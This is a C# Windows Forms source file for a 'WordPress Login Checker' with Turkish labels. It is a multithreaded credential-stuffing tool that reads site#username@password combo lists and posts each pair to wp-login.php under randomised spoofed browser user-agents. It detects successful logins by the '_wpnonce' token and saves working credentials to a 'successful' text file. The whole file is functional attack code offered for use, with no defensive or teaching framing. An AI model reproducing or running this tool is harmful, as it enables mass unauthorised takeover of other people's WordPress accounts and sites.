namespace WordPress_Login_Checker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        #region Deðiþkenler
        private Random rastgele = new Random();
        List<Thread> threads = new List<Thread>();
        bool threadStop = false;
        OpenFileDialog openFileDialog1 = new OpenFileDialog();
        #endregion
        #region Methodlar
        public string UserAgent()
        {
            string agent = "";
            int rastgeleüret = rastgele.Next(1, 9);
            int sayi = rastgeleüret;
            int firefoxversionone = rastgele.Next(80, 87);
            int firefoxversiontwo = rastgele.Next(0, 9);

            int applewebkitone = rastgele.Next(530, 538);
            int applewebkittwo = rastgele.Next(30, 37);

            int chromeone = rastgele.Next(80, 87);
            int chrometwo = rastgele.Next(2148, 4148);
            int chromethree = rastgele.Next(30, 84);

            int macosone = rastgele.Next(0, 10);
            int macostwo = rastgele.Next(0, 10);
            switch (sayi)
            {
                case 1:
                    agent = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 2:
                    agent = "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 3:
                    agent = "Mozilla/5.0 (Windows NT 6.3) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 4:
                    agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 5:
                    agent = "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 6:
                    agent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 7:
                    agent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
                case 8:
                    agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/" + applewebkitone + "." + applewebkittwo + " (KHTML, like Gecko) Chrome/" + chromeone + ".0." + chrometwo + "." + chromethree + " Safari/" + applewebkitone + "." + applewebkittwo;
                    break;
            }
            return agent;
        }
        private void loginChecker(List<string> siteList)
        {
            foreach (var siteData in siteList)
            {
                if (threadStop)
                    break;

                try
                {
                    string wordpressUrl = siteData.Split('#')[0];
                    string username = siteData.Split('#')[1].Split('@')[0];
                    string password = siteData.Split('#')[1].Split('@')[1];

                    using (HttpClient httpClient = new HttpClient())
                    {
                        httpClient.Timeout = TimeSpan.FromSeconds(int.Parse(txt_Timeout.Text));
                        httpClient.DefaultRequestHeaders.Add("user-agent", UserAgent());

                        var formContent = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>("log", username),
                            new KeyValuePair<string, string>("pwd", password),
                            new KeyValuePair<string, string>("redirect_to", wordpressUrl.Replace("wp-login.php", "wp-admin")),
                            new KeyValuePair<string, string>("testcookie", "1"),
                        });

                        HttpResponseMessage loginResponse = httpClient.PostAsync(wordpressUrl, formContent).Result;
                        string loginResponseHtml = loginResponse.Content.ReadAsStringAsync().Result;

                        if (loginResponseHtml.Contains("_wpnonce"))
                        {
                            listBox2.Items.Add($"{wordpressUrl}#{username}@{password}");
                            label4.Text = (Convert.ToInt32(label4.Text) + 1).ToString();
                            using (StreamWriter file = File.AppendText("baþarýlý.txt"))
                            {
                                file.WriteLine($"{wordpressUrl}#{username}@{password}");
                            }
                        }

                        else
                        {
                            label6.Text = (Convert.ToInt32(label6.Text) + 1).ToString();
                        }
                    }
                }
                catch
                {
                    label6.Text = (Convert.ToInt32(label6.Text) + 1).ToString();
                }
                progressBar1.Value += 1;
            }
        }
        #endregion
        #region Butonlar
        private void button1_Click(object sender, EventArgs e)
        {
            if (listBox1.Items.Count == 0)
            {
                MessageBox.Show("Site listesi girmediniz.");
                return;
            }

            List<List<string>> siteList = new List<List<string>>();

            int thread = Math.Min(Convert.ToInt32(numericUpDown1.Value), listBox1.Items.Count);
            int sitesPerThread = listBox1.Items.Count / thread;
            int remainingSites = listBox1.Items.Count % thread;
            int currentIndex = 0;

            for (int i = 0; i < thread; i++)
            {
                List<string> subList = new List<string>();
                int sitesToAdd = sitesPerThread + (i < remainingSites ? 1 : 0);

                for (int j = 0; j < sitesToAdd; j++)
                {
                    subList.Add(listBox1.Items[currentIndex++].ToString());
                }
                siteList.Add(subList);
            }

            foreach (List<string> item in siteList)
            {
                Thread threadd = new Thread(() => loginChecker(item));
                threadd.Start();
                threads.Add(threadd);
            }
        }
        private void button2_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if (!string.IsNullOrEmpty(openFileDialog1.FileName))
                {
                    try
                    {
                        using (StreamReader reader = new StreamReader(openFileDialog1.FileName))
                        {
                            string line;

                            while ((line = reader.ReadLine()) != null)
                            {
                                listBox1.Items.Add(line);
                            }
                        }

                        label2.Text = listBox1.Items.Count.ToString();
                        progressBar1.Maximum = Convert.ToInt32(label2.Text);
                        progressBar1.Value = 0;
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show("Dosya okuma hatasý: " + ex.Message, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }

        }
        private void button3_Click(object sender, EventArgs e)
        {
            threadStop = true;
            foreach (Thread thread in threads)
            {
                thread.Join();
            }
            MessageBox.Show("Program durduruldu.");
        }
        #endregion

    }
}